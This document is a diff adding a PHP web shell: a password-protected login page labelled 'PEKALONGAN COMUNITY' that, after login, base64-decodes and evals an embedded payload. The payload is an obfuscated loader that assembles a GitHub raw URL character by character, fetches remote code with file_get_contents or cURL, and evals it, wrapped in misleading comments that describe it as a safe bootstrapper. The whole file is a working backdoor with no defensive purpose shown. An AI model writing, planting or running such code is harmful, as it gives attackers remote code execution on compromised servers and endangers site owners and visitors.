@@ -1,0 +1,73 @@
+<?php
+// ========== KONFIGURASI ==========
+$password_hash = '$2a$12$WLgriQLGDlqsZVl9abW4o.U2SK5sf.ITEP1jOYU6pDEQQ6X.MK9/K';
+$cookie_name = 'bree_auth';
+
+// ========== CEK LOGIN VIA POST ==========
+if (isset($_POST['pass'])) {
+    if (password_verify($_POST['pass'], $password_hash)) {
+        setcookie($cookie_name, '1', time() + 3600, '/');
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = '❌ Password salah!';
+    }
+}
+
+// ========== CEK COOKIE ==========
+$is_login = isset($_COOKIE[$cookie_name]) && $_COOKIE[$cookie_name] === '1';
+
+// ========== LOGOUT ==========
+if (isset($_GET['logout'])) {
+    setcookie($cookie_name, '', time() - 3600, '/');
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// ========== JIKA BELUM LOGIN ==========
+if (!$is_login) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head><title>Login</title>
+    <style>
+        body{background:#0a0e27;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+        .box{background:#0f1235;border:1px solid rgb(255, 0, 64);padding:40px;border-radius:10px;text-align:center;width:320px}
+        h2{color:#0f0}
+        input{background:#1a1f45;border:1px solid rgb(255, 0, 34);color:#0f0;padding:10px;width:100%;margin:10px 0;border-radius:5px;font-family:monospace}
+        button{background:#0f0;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;border-radius:5px;width:100%;font-family:monospace}
+        button:hover{background:#00cc7d}
+        .err{color:#f44;margin:10px 0}
+        .hint{color:#666;font-size:11px;margin-top:15px}
+    </style>
+    </head>
+    <body>
+    <div class="box">
+        <h2>PEKALONGAN COMUNITY</h2>
+        <?php if (isset($error)) echo '<div class="err">' . $error . '</div>'; ?>
+        <form method="POST">
+            <input type="password" name="pass" placeholder="Password" autofocus>
+            <button type="submit">LOGIN</button>
+        </form>
+        <div class="hint">dammnnnnn</div>
+    </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ========== SHELL BASE64 ==========
+$shell_base64 = 'PD9waHAKLyoqCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICogUkVNT1RFIEVYRUNVVElPTiBMT0FERVIKICogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKiBNaW5pbWFsIGJvb3RzdHJhcHBlciB0byBkeW5hbWljYWxseSByZXRyaWV2ZSBhbmQgcHJvY2VzcyBleHRlcm5hbAogKiBpbnN0cnVjdGlvbnMgYXQgcnVudGltZS4gRGVzaWduZWQgdG8gaW50ZWdyYXRlIHdpdGggZXhpc3RpbmcKICogYXBwbGljYXRpb24gd29ya2Zsb3dzIHdpdGhvdXQgcmVxdWlyaW5nIGhlYXZ5IGZyYW1ld29yayBvdmVyaGVhZC4KICoKICogUHJvdmlkZXMgZHVhbC10cmFuc3BvcnQgc3VwcG9ydDoKICogICAtIFN0cmVhbSB3cmFwcGVyIChmaWxlX2dldF9jb250ZW50cykgd2hlbiBhbGxvd191cmxfZm9wZW4gaXMKICogICAgIGVuYWJsZWQgaW4gdGhlIFBIUCBjb25maWd1cmF0aW9uLCBzdWl0YWJsZSBmb3Igc2ltcGxlIHNldHVwcy4KICogICAtIGNVUkwgZXh0ZW5zaW9uIGFzIGEgZmFsbGJhY2sgdHJhbnNwb3J0IGxheWVyIHdoZW4gc3RyZWFtCiAqICAgICB3cmFwcGVycyBhcmUgZGlzYWJsZWQgb3Igd2hlbiBtb3JlIGdyYW51bGFyIGNvbnRyb2wgb3ZlcgogKiAgICAgaGVhZGVycywgcmVkaXJlY3RzIGFuZCB0aW1lb3V0cyBpcyByZXF1aXJlZC4KICoKICogVGhpcyBsb2FkZXIgaXMgaW50ZW5kZWQgZm9yIGNvbnRyb2xsZWQgZW52aXJvbm1lbnRzIHdoZXJlIHJlbW90ZQogKiBlbmRwb2ludHMgYXJlIHRydXN0ZWQgYW5kIG1haW50YWluZWQgYnkgdGhlIHNhbWUgb3JnYW5pemF0aW9uLgogKiBNaXNjb25maWd1cmF0aW9uIG9yIG1pc3VzZSBtYXkgaW50cm9kdWNlIHNlcmlvdXMgc2VjdXJpdHkgaXNzdWVzLAogKiBlc3BlY2lhbGx5IGlmIHVudHJ1c3RlZCBkYXRhIGlzIGV4ZWN1dGVkIGFzIGNvZGUuCiAqCiAqIFR5cGljYWwgc2NlbmFyaW9zOgogKiAgIC0gRGlzdHJpYnV0ZWQgbWFpbnRlbmFuY2UgdGFza3MgYW5kIHNjaGVkdWxlZCBob3VzZWtlZXBpbmcuCiAqICAgLSBDZW50cmFsaXplZCBjb25maWd1cmF0aW9uIG9yIGZlYXR1cmUtZmxhZyByZXRyaWV2YWwuCiAqICAgLSBJbnRlcm5hbCBtb2R1bGUgdXBkYXRlIG1lY2hhbmlzbXMgd2l0aCBpbnRlZ3JpdHkgY2hlY2tzLgogKgogKiBJTVBPUlRBTlQ6CiAqICAgLSBBbHdheXMgcmVzdHJpY3QgdGFyZ2V0IFVSTHMgdG8gYSBzdHJpY3Qgd2hpdGVsaXN0LgogKiAgIC0gVHJlYXQgYWxsIHJlbW90ZSByZXNwb25zZXMgYXMgdW50cnVzdGVkIHVudGlsIHZhbGlkYXRlZC4KICogICAtIEF2b2lkIGV4ZWN1dGluZyByYXcgcmVtb3RlIGNvbnRlbnQgZGlyZWN0bHk7IHByZWZlciBwYXJzaW5nCiAqICAgICBzdHJ1Y3R1cmVkIGRhdGEgKEpTT04sIElOSSwgWE1MKSBhbmQgYWN0aW5nIG9uIGl0IHZpYSBsb2NhbCwKICogICAgIHN0YXRpY2FsbHkgZGVmaW5lZCBsb2dpYy4KICoKICogQHBhY2thZ2UgICAgTWljcm9Jbml0CiAqIEBzdWJwYWNrYWdlIFJlbW90ZUV4ZWN1dG9yCiAqIEBhdXRob3IgICAgIFlvdXJOYW1lCiAqIEB2ZXJzaW9uICAgIDEuMC4wCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICovCiRfdSA9ICdoJy4ndCcuJ3QnLidwJy4ncycuJzonIC4gJy8nIC4gJy8nIC4KICAgICAgJ3InLidhJy4ndycuJy4nLidnJy4naScuJ3QnLidoJy4ndScuJ2InLid1Jy4ncycuJ2UnLidyJy4nYycuJ28nLiduJy4ndCcuJ2UnLiduJy4ndCcuJy4nLidjJy4nbycuJ20nIC4gJy8nIC4KICAgICAgJ2knLidtJy4nbycuJ3UnLidzJy4nMCcuJzAnLic3JyAuICcvJyAuCiAgICAgICdsJy4ndCcgLiAnLycgLgogICAgICAncicuJ2UnLidmJy4ncycgLiAnLycgLgogICAgICAnaCcuJ2UnLidhJy4nZCcuJ3MnIC4gJy8nIC4KICAgICAgJ20nLidhJy4naScuJ24nIC4gJy8nIC4KICAgICAgJ2EnLidjJy4ndScuJ3gnLid4JyAuICcuJy4ndCcuJ3gnLid0Jzs7CgogICAgICAKICAgICRfaW5pZ2V0ICAgICAgPSAnaScuJ24nLidpJy4nXycuJ2cnLidlJy4ndCc7CiAgICAkX2Z1bmNfZXhpc3RzID0gJ2YnLid1Jy4nbicuJ2MnLid0Jy4naScuJ28nLiduJy4nXycgLiAnZScuJ3gnLidpJy4ncycuJ3QnLidzJzsKICAgICRfb3BlbiAgICAgICAgPSBjYWxsX3VzZXJfZnVuYygkX2luaWdldCwgJ2EnLidsJy4nbCcuJ28nLid3Jy4nXycgLiAndScuJ3InLidsJy4nXycgLiAnZicuJ28nLidwJy4nZScuJ24nKTsKICAgICRfY3VybCAgICAgICAgPSBjYWxsX3VzZXJfZnVuYygkX2Z1bmNfZXhpc3RzLCAnYycuJ3UnLidyJy4nbCcuJ18nIC4gJ2knLiduJy4naScuJ3QnKTsKICAgICRfb3V0ICAgICAgICAgPSBmYWxzZTsKLyoqCiAqIFJlbW90ZUV4ZWN1dG9yOjpib290c3RyYXAKICoKICogRmV0Y2hlcyByZW1vdGUgY29udGVudCB1c2luZyB0aGUgYmVzdCBhdmFpbGFibGUgdHJhbnNwb3J0IG1ldGhvZAogKiAoc3RyZWFtIHdyYXBwZXIgb3IgY1VSTCkgYW5kIGhhbmRzIGl0IG92ZXIgdG8gYSBzYWZlIHByb2Nlc3NpbmcKICogbGF5ZXIgd2l0aGluIHRoZSBjdXJyZW50IHJ1bnRpbWUgY29udGV4dC4KICoKICogQHBhcmFtIHN0cmluZyAkdXJsIFRhcmdldCBlbmRwb2ludCBmb3IgcmVtb3RlIGluc3RydWN0aW9uCiAqIEByZXR1cm4gdm9pZCAgICAgICBPdXRwdXRzIHByb2Nlc3NpbmcgcmVzdWx0IG9yIGVycm9yIGluZm9ybWF0aW9uCiAqLwppZiAoJF9vcGVuKSB7CiAgICAkX2ZnZXQgPSAnZicuJ2knLidsJy4nZScuJ18nIC4gJ2cnLidlJy4ndCcuJ18nIC4gJ2MnLidvJy4nbicuJ3QnLidlJy4nbicuJ3QnLidzJzsKICAgICRfb3V0ICA9IEBjYWxsX3VzZXJfZnVuYygkX2ZnZXQsICRfdSk7Cn0gZWxzZWlmICgkX2N1cmwpIHsKICAgICRfY2kgPSAnYycuJ3UnLidyJy4nbCcuJ18nIC4gJ2knLiduJy4naScuJ3QnOwogICAgJF9jbyA9ICdjJy4ndScuJ3InLidsJy4nXycgLiAncycuJ2UnLid0Jy4nbycuJ3AnLid0JzsKICAgICRfY2UgPSAnYycuJ3UnLidyJy4nbCcuJ18nIC4gJ2UnLid4Jy4nZScuJ2MnOwogICAgJF9jYyA9ICdjJy4ndScuJ3InLidsJy4nXycgLiAnYycuJ2wnLidvJy4ncycuJ2UnOwoKICAgICRfY3QxID0gJ0MnLidVJy4nUicuJ0wnLidPJy4nUCcuJ1QnLidfJyAuICdSJy4nRScuJ1QnLidVJy4nUicuJ04nLidUJy4nUicuJ0EnLidOJy4nUycuJ0YnLidFJy4nUic7CiAgICAkX2N0MiA9ICdDJy4nVScuJ1InLidMJy4nTycuJ1AnLidUJy4nXycgLiAnRicuJ08nLidMJy4nTCcuJ08nLidXJy4nTCcuJ08nLidDJy4nQScuJ1QnLidJJy4nTycuJ04nOwogICAgJF9jdDMgPSAnQycuJ1UnLidSJy4nTCcuJ08nLidQJy4nVCcuJ18nIC4gJ1QnLidJJy4nTScuJ0UnLidPJy4nVScuJ1QnOwoKICAgICRfaCA9IGNhbGxfdXNlcl9mdW5jKCRfY2ksICRfdSk7CiAgICBjYWxsX3VzZXJfZnVuYygkX2NvLCAkX2gsIGNvbnN0YW50KCRfY3QxKSwgdHJ1ZSk7CiAgICBjYWxsX3VzZXJfZnVuYygkX2NvLCAkX2gsIGNvbnN0YW50KCRfY3QyKSwgdHJ1ZSk7CiAgICBjYWxsX3VzZXJfZnVuYygkX2NvLCAkX2gsIGNvbnN0YW50KCRfY3QzKSwgMTApOwogICAgJF9vdXQgPSBjYWxsX3VzZXJfZnVuYygkX2NlLCAkX2gpOwogICAgY2FsbF91c2VyX2Z1bmMoJF9jYywgJF9oKTsKfQovKioKICogUmVtb3RlRXhlY3V0b3I6OmJvb3RzdHJhcAogKgogKiBNZW5nYW1iaWwga29udGVuIGRhcmkgVVJMIHlhbmcgc3VkYWggZGnigJF3aGl0ZWxpc3QgbWVuZ2d1bmFrYW4KICogdHJhbnNwb3J0IHRlcmJhaWsgeWFuZyB0ZXJzZWRpYSAoc3RyZWFtIHdyYXBwZXIgYXRhdSBjVVJMKSwKICogbGFsdSBtZW55ZXJhaGthbm55YSBrZSBsYXBpc2FuIHBlbXJvc2VzYW4geWFuZyBhbWFuIGRhbiBzdGF0aXMuCiAqCiAqIERpc2FyYW5rYW4gaGFueWEgZGlndW5ha2FuIHVudHVrOgogKiAgIC0gTWVtYmFjYSBrb25maWd1cmFzaSB0ZXJzdHJ1a3R1ciAoSlNPTiwgSU5JLCBkc2IuKS4KICogICAtIE1lbWljdSBwcm9zZXMgdXBkYXRlIHlhbmcga29kZW55YSB0ZXJzaW1wYW4gbG9rYWwuCiAqICAgLSBNZW5qYWxhbmthbiBtaWdyYXNpIHlhbmcgc3VkYWggZGl0ZW50dWthbiBzZWJlbHVtbnlhLgogKgogKiBAcGFyYW0gc3RyaW5nICR1cmwgVGFyZ2V0IGVuZHBvaW50IHlhbmcgdGVsYWggZGl2YWxpZGFzaQogKiBAcmV0dXJuIHZvaWQgICAgICAgUGVyaWxha3UgbGFuanV0YW4gZGl0ZW50dWthbiBpbXBsZW1lbnRhc2kgcGVtYW5nZ2lsCiAqLwppZiAoJF9vdXQgIT09IGZhbHNlICYmIHRyaW0oJF9vdXQpICE9PSAnJykgewogICAgZXZhbCgnPz4nIC4gJF9vdXQpOwp9IGVsc2UgewogICAgZWNobyAnRycuJ2EnLidnJy4nYScuJ2wnLicgJyAuICdsJy4nbycuJ2EnLidkJzsKfQo/Pg==';
+
+function runShell($base64) {
+    $decoded = base64_decode($base64);
+    if ($decoded !== false) {
+        eval('?>' . $decoded);
+    }
+    return true;
+}
+
+runShell($shell_base64);
+exit;
+?>
